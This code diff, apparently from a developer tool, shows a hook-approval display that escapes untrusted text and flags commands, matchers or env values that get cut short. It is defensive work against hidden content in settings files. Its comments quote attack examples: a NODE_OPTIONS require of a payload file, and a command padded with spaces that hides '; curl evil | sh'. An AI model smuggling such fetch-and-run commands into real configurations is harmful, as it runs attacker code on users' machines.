@@ -95,7 +95,7 @@ function visibleEscape(character: string): string {
   if (character === '\n') return '\\n';
   if (character === '\r') return '\\r';
   if (character === '\t') return '\\t';
-  const hex = character.charCodeAt(0).toString(16);
+  const hex = character.codePointAt(0)!.toString(16);
   return hex.length <= 2 ? `\\x${hex.padStart(2, '0')}` : `\\u${hex.padStart(4, '0')}`;
 }
 
@@ -113,8 +113,9 @@ function visibleEscape(character: string): string {
  *
  * The limit counts the escaped length. The walk is by code point and an escape
  * goes in whole or not at all, so the cut never leaves half of one, or half of
- * a surrogate pair: a backslash the value itself holds is kept, so half an
- * escape could not be told from text and removed afterwards.
+ * a surrogate pair. A backslash the value itself holds is kept, so a Windows
+ * path reads as itself: the output is for reading, not for decoding, and text
+ * spelling `\n` reads the same as a newline.
  */
 export function renderUntrustedText(value: string, maxLength = 200): string {
   let rendered = '';
@@ -126,6 +127,11 @@ export function renderUntrustedText(value: string, maxLength = 200): string {
   return rendered;
 }
 
+/** Whether {@link renderUntrustedText} cuts `value` short at this limit. */
+function isCutShort(value: string, maxLength?: number): boolean {
+  return renderUntrustedText(value, maxLength) !== renderUntrustedText(value, Infinity);
+}
+
 /**
  * Everything the fingerprint covers, rendered for a trust decision.
  *
@@ -133,19 +139,25 @@ export function renderUntrustedText(value: string, maxLength = 200): string {
  * showing only the command understates what approval grants: `npm test` with
  * `NODE_OPTIONS=--require ./payload.js` reads as harmless and is not. Two
  * entries differing only in matcher or env are also indistinguishable without
- * these lines.
+ * these lines. Approval also covers what a long value's cut leaves out (`npm test`, 300 spaces,
+ * then `; curl evil | sh`), so a cut entry says so and names the file to read.
  */
 export function describeDeclaredHook(hook: DeclaredHook): { headline: string; details: string[] } {
+  const { command, matcher } = hook.entry;
+  const env = Object.entries(hook.entry.env ?? {}).sort(([a], [b]) => a.localeCompare(b));
   const details = [`fingerprint: ${hookFingerprint(hook.event, hook.entry)}`];
-  if (hook.entry.matcher !== undefined) {
-    details.push(`matcher:     ${renderUntrustedText(hook.entry.matcher)}`);
-  }
-  for (const [key, value] of Object.entries(hook.entry.env ?? {}).sort(([a], [b]) =>
-    a.localeCompare(b),
-  )) {
+  if (matcher !== undefined) details.push(`matcher:     ${renderUntrustedText(matcher)}`);
+  for (const [key, value] of env) {
     details.push(`env:         ${renderUntrustedText(key, 64)}=${renderUntrustedText(value)}`);
   }
-  return { headline: `${hook.event}: ${renderUntrustedText(hook.entry.command)}`, details };
+  const cutShort =
+    isCutShort(command) ||
+    (matcher !== undefined && isCutShort(matcher)) ||
+    env.some(([key, value]) => isCutShort(key, 64) || isCutShort(value));
+  if (cutShort) {
+    details.push('truncated:   approval covers all of it, so read it in .book/settings.json first');
+  }
+  return { headline: `${hook.event}: ${renderUntrustedText(command)}`, details };
 }
 
 /**
